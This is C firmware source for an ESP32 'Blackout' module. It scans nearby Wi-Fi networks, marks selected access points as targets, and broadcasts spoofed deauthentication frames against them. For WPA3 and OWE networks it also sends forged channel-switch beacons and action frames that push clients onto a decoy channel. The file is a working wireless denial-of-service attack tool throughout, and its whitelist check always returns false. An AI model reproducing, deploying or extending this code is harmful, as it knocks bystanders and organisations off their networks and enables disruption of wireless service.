#include "blackout_shared.h"

#include <string.h>

#include "esp_event.h"
#include "esp_heap_caps.h"
#include "esp_netif.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#if CONFIG_ESP_WIFI_NVS_ENABLED
#include "nvs_flash.h"
#endif

// Data and helpers originally supplied by ProjectZero's monolithic main.c.
// The separate Buddy display and radio adapters supply their hardware hooks.
wifi_ap_record_t g_scan_results[MAX_AP_CNT];
uint16_t g_scan_count = 0;
volatile bool g_scan_in_progress = false;
volatile bool g_scan_done = false;
int g_selected_indices[MAX_AP_CNT];
int g_selected_count = 0;
target_bssid_t target_bssids[MAX_TARGET_BSSIDS];
int target_bssid_count = 0;
volatile bool operation_stop_requested = false;

static esp_event_handler_instance_t scan_event_instance;
static bool scan_event_registered = false;
static bool netif_initialized = false;
static bool event_loop_ready = false;
static bool wifi_started = false;
#if CONFIG_ESP_WIFI_NVS_ENABLED
static bool nvs_initialized = false;
#endif

static void blackout_scan_done(void *arg, esp_event_base_t base,
                               int32_t event_id, void *event_data)
{
    (void)arg;
    if (base != WIFI_EVENT || event_id != WIFI_EVENT_SCAN_DONE ||
        !g_scan_in_progress) {
        return;
    }

    const wifi_event_sta_scan_done_t *event =
        (const wifi_event_sta_scan_done_t *)event_data;
    if (event != NULL && event->status == 0) {
        g_scan_count = MAX_AP_CNT;
        esp_err_t err = esp_wifi_scan_get_ap_records(&g_scan_count,
                                                      g_scan_results);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Reading scan records failed: %s", esp_err_to_name(err));
            g_scan_count = 0;
        }
    } else {
        g_scan_count = 0;
    }
    g_scan_done = true;
    g_scan_in_progress = false;
}

int get_scan_timeout_iterations(void)
{
    // ProjectZero's default max channel time is 300 ms. Preserve its formula.
    return (14 * FAST_SCAN_MAX_TIME + 15000) / 100;
}

esp_err_t start_background_scan(uint32_t min_time, uint32_t max_time)
{
    if (g_scan_in_progress) {
        return ESP_ERR_INVALID_STATE;
    }

    if (!scan_event_registered) {
        esp_err_t err = esp_event_handler_instance_register(
            WIFI_EVENT, WIFI_EVENT_SCAN_DONE, blackout_scan_done, NULL,
            &scan_event_instance);
        if (err != ESP_OK) {
            return err;
        }
        scan_event_registered = true;
    }

    wifi_scan_config_t scan_cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = min_time,
        .scan_time.active.max = max_time,
    };

    g_scan_in_progress = true;
    g_scan_done = false;
    g_scan_count = 0;
    esp_err_t err = esp_wifi_scan_start(&scan_cfg, false);
    if (err != ESP_OK) {
        g_scan_in_progress = false;
    }
    return err;
}

void blackout_shared_release(void)
{
    // Called after blackout_stop(): ensure an asynchronous scan cannot carry
    // state into the next Lab Tester run.
    bool scan_was_active = g_scan_in_progress;
    g_scan_in_progress = false;
    if (scan_was_active) {
        esp_wifi_scan_stop();
    }
    if (scan_event_registered) {
        esp_event_handler_instance_unregister(WIFI_EVENT, WIFI_EVENT_SCAN_DONE,
                                              scan_event_instance);
        scan_event_registered = false;
    }
    g_scan_done = false;
    g_scan_count = 0;
    g_selected_count = 0;
}

static bool authmode_needs_csa(wifi_auth_mode_t mode)
{
    return mode == WIFI_AUTH_WPA3_PSK
        || mode == WIFI_AUTH_WPA2_WPA3_PSK
        || mode == WIFI_AUTH_OWE;
}

static bool authmode_needs_deauth(wifi_auth_mode_t mode)
{
    return mode != WIFI_AUTH_WPA3_PSK && mode != WIFI_AUTH_OWE;
}

static uint8_t csa_operating_class(uint8_t channel)
{
    if (channel >= 1 && channel <= 13) return 81;
    if (channel == 14) return 82;
    if (channel >= 36 && channel <= 48) return 115;
    if (channel >= 52 && channel <= 64) return 118;
    if (channel >= 100 && channel <= 144) return 121;
    if (channel >= 149 && channel <= 177) return 125;
    return (channel <= 14) ? 81 : 115;
}

static uint8_t csa_decoy_channel(uint8_t ap_channel)
{
    if (ap_channel > 14) return (ap_channel == 36) ? 40 : 36;
    return (ap_channel == 1) ? 6 : 1;
}

void save_target_bssids(void)
{
    target_bssid_count = 0;
    for (int i = 0;
         i < g_selected_count && target_bssid_count < MAX_TARGET_BSSIDS; ++i) {
        int idx = g_selected_indices[i];
        wifi_ap_record_t *ap = &g_scan_results[idx];
        target_bssid_t *target = &target_bssids[target_bssid_count];

        target->channel = ap->primary;
        target->authmode = ap->authmode;
        target->last_seen = esp_timer_get_time() / 1000;
        target->active = true;
        memcpy(target->bssid, ap->bssid, 6);
        strncpy(target->ssid, (const char *)ap->ssid, 32);
        target->ssid[32] = '\0';
        ++target_bssid_count;
    }

    for (int i = 0; i < target_bssid_count; ++i) {
        ESP_LOGI(TAG, "Target BSSID[%d]: %s, Channel: %d", i,
                 target_bssids[i].ssid, target_bssids[i].channel);
        if (authmode_needs_csa(target_bssids[i].authmode)) {
            uint8_t decoy = csa_decoy_channel(target_bssids[i].channel);
            ESP_LOGI(TAG, "%s: %s ch=%d -> decoy %d",
                     authmode_needs_deauth(target_bssids[i].authmode)
                         ? "Deauth+CSA" : "CSA",
                     target_bssids[i].ssid, target_bssids[i].channel, decoy);
        }
    }
}

bool ensure_wifi_mode(void)
{
    if (wifi_started) {
        return true;
    }

#if CONFIG_ESP_WIFI_NVS_ENABLED
    if (!nvs_initialized) {
        esp_err_t err = nvs_flash_init();
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "NVS initialization failed: %s", esp_err_to_name(err));
            return false;
        }
        nvs_initialized = true;
    }
#endif

    if (!netif_initialized) {
        esp_err_t err = esp_netif_init();
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Network stack initialization failed: %s",
                     esp_err_to_name(err));
            return false;
        }
        netif_initialized = true;
    }

    if (!event_loop_ready) {
        esp_err_t err = esp_event_loop_create_default();
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
            ESP_LOGE(TAG, "Wi-Fi event loop initialization failed: %s",
                     esp_err_to_name(err));
            return false;
        }
        event_loop_ready = true;
    }

    wifi_mode_t mode = WIFI_MODE_NULL;
    esp_err_t err = esp_wifi_get_mode(&mode);
    if (err == ESP_ERR_WIFI_NOT_INIT) {
        wifi_init_config_t config = WIFI_INIT_CONFIG_DEFAULT();
        err = esp_wifi_init(&config);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Wi-Fi driver initialization failed: %s",
                     esp_err_to_name(err));
            return false;
        }
    } else if (err != ESP_OK) {
        ESP_LOGE(TAG, "Reading Wi-Fi mode failed: %s", esp_err_to_name(err));
        return false;
    }

    if (mode != WIFI_MODE_STA) {
        err = esp_wifi_set_mode(WIFI_MODE_STA);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Setting Wi-Fi STA mode failed: %s",
                     esp_err_to_name(err));
            return false;
        }
    }

    err = esp_wifi_start();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Starting Wi-Fi failed: %s", esp_err_to_name(err));
        return false;
    }

    wifi_started = true;
    return true;
}

void log_memory_info(const char *context)
{
    ESP_LOGI(TAG, "[MEM] %s: Internal=%u KB, PSRAM=%u KB", context,
             (unsigned)(heap_caps_get_free_size(MALLOC_CAP_INTERNAL) / 1024),
             (unsigned)(heap_caps_get_free_size(MALLOC_CAP_SPIRAM) / 1024));
}

// Buddy's board has no ProjectZero addressable status LED.
esp_err_t led_set_color(uint8_t red, uint8_t green, uint8_t blue)
{
    (void)red;
    (void)green;
    (void)blue;
    return ESP_OK;
}

esp_err_t led_clear(void)
{
    return ESP_OK;
}

esp_err_t led_set_idle(void)
{
    return ESP_OK;
}

// ProjectZero's low-level sender: its extra gateway backoff is inactive here.
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}

static void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size)
{
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
    if (err == ESP_ERR_NO_MEM) {
        // Preserve ProjectZero's 20 ms backoff for standalone Blackout mode.
        vTaskDelay(pdMS_TO_TICKS(20));
    } else if (err != ESP_OK) {
        ESP_LOGW(TAG, "Raw frame TX failed: %s", esp_err_to_name(err));
    }
}

static int build_beacon_frame(uint8_t *frame_buffer, size_t buffer_size,
                              const char *ssid, const uint8_t *bssid,
                              uint8_t channel)
{
    if (!frame_buffer || !ssid || !bssid || buffer_size < 200) return 0;

    int ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    int pos = 0;
    frame_buffer[pos++] = 0x80;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    memset(&frame_buffer[pos], 0xFF, 6);
    pos += 6;
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;

    uint64_t timestamp = esp_timer_get_time();
    memcpy(&frame_buffer[pos], &timestamp, 8);
    pos += 8;
    frame_buffer[pos++] = 0x64;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = ssid_len;
    memcpy(&frame_buffer[pos], ssid, ssid_len);
    pos += ssid_len;

    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = 0x08;
    frame_buffer[pos++] = 0x82;
    frame_buffer[pos++] = 0x84;
    frame_buffer[pos++] = 0x8B;
    frame_buffer[pos++] = 0x96;
    frame_buffer[pos++] = 0x24;
    frame_buffer[pos++] = 0x30;
    frame_buffer[pos++] = 0x48;
    frame_buffer[pos++] = 0x6C;
    frame_buffer[pos++] = 0x03;
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = channel;
    return pos;
}

static int build_csa_beacon_frame(uint8_t *frame_buffer, size_t buffer_size,
                                  const char *ssid, const uint8_t *bssid,
                                  uint8_t ap_channel, uint8_t decoy_channel)
{
    int pos = build_beacon_frame(frame_buffer, buffer_size, ssid, bssid,
                                 ap_channel);
    if (pos <= 0 || (size_t)pos + 14 > buffer_size) return 0;

    uint8_t op_class = csa_operating_class(decoy_channel);
    frame_buffer[pos++] = 0x25;
    frame_buffer[pos++] = 0x03;
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = decoy_channel;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x3C;
    frame_buffer[pos++] = 0x04;
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = op_class;
    frame_buffer[pos++] = decoy_channel;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x3E;
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = 0x00;
    return pos;
}

static int build_csa_action_frame(uint8_t *frame_buffer, size_t buffer_size,
                                  const uint8_t *dest, const uint8_t *bssid,
                                  uint8_t decoy_channel)
{
    if (!frame_buffer || !dest || !bssid || buffer_size < 31) return 0;

    int pos = 0;
    frame_buffer[pos++] = 0xD0;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    memcpy(&frame_buffer[pos], dest, 6);
    pos += 6;
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;
    memcpy(&frame_buffer[pos], bssid, 6);
    pos += 6;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x00;
    frame_buffer[pos++] = 0x04;
    frame_buffer[pos++] = 0x25;
    frame_buffer[pos++] = 0x03;
    frame_buffer[pos++] = 0x01;
    frame_buffer[pos++] = decoy_channel;
    frame_buffer[pos++] = 0x00;
    return pos;
}

static void wsl_bypasser_send_csa_frames(const target_bssid_t *target)
{
    static const uint8_t broadcast_mac[6] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    };
    uint8_t decoy = csa_decoy_channel(target->channel);
    uint8_t beacon[256];
    uint8_t action[32];

    int len = build_csa_beacon_frame(beacon, sizeof(beacon), target->ssid,
                                     target->bssid, target->channel, decoy);
    if (len > 0) wsl_bypasser_send_raw_frame(beacon, len);

    len = build_csa_action_frame(action, sizeof(action), broadcast_mac,
                                 target->bssid, decoy);
    if (len > 0) wsl_bypasser_send_raw_frame(action, len);
}

// ProjectZero loads a BSSID whitelist from SD. Buddy has no SD or configured
// whitelist, so it starts with the same empty whitelist state as ProjectZero
// when no SD card is present.
static bool is_bssid_whitelisted(const uint8_t *bssid)
{
    (void)bssid;
    return false;
}

void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records,
                                                  size_t count)
{
    (void)ap_records;
    (void)count;

    // ProjectZero's gateway, evil-twin and selected-station branches are
    // inactive for standalone Blackout; retain its active sender path.
    for (int i = 0; i < target_bssid_count; ++i) {
        if (operation_stop_requested) return;
        if (!target_bssids[i].active) continue;
        if (is_bssid_whitelisted(target_bssids[i].bssid)) continue;

        vTaskDelay(pdMS_TO_TICKS(50));
        esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(50));

        if (authmode_needs_deauth(target_bssids[i].authmode)) {
            static const uint8_t deauth_frame_default[] = {
                0xC0, 0x00, 0x00, 0x00,
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x01, 0x00
            };
            uint8_t frame[sizeof(deauth_frame_default)];
            memcpy(frame, deauth_frame_default, sizeof(frame));
            memcpy(&frame[10], target_bssids[i].bssid, 6);
            memcpy(&frame[16], target_bssids[i].bssid, 6);
            wsl_bypasser_send_raw_frame(frame, sizeof(frame));
        }

        if (authmode_needs_csa(target_bssids[i].authmode)) {
            wsl_bypasser_send_csa_frames(&target_bssids[i]);
        }
    }
}
